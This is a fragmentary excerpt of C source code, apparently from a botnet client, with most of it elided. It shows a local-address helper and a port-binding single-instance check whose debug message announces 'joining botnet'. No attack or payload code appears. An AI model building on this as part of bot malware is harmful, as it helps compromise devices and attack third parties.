...
ipv4_t util_local_addr(void)
{
    ...
    {
#ifdef DEBUG
        printf("(atomic/util) Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }
...
int ensure_single_instance() {
    ...
    if (sockfd == -1) {
        #ifdef DEBUG
            printf("(atomic/ensure) Error creating socket for ESI port\n");
        #endif
        exit(1);
    }
    ...
    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        #ifdef DEBUG
            printf("(atomic/ensure) Another instance is already running\n");
        #endif
        close(sockfd);
        return 1;
    }
    ...
    #ifdef DEBUG
        printf("(atomic/ensure) No other instance detected, joining botnet\n");
    #endif
    return 0;
}
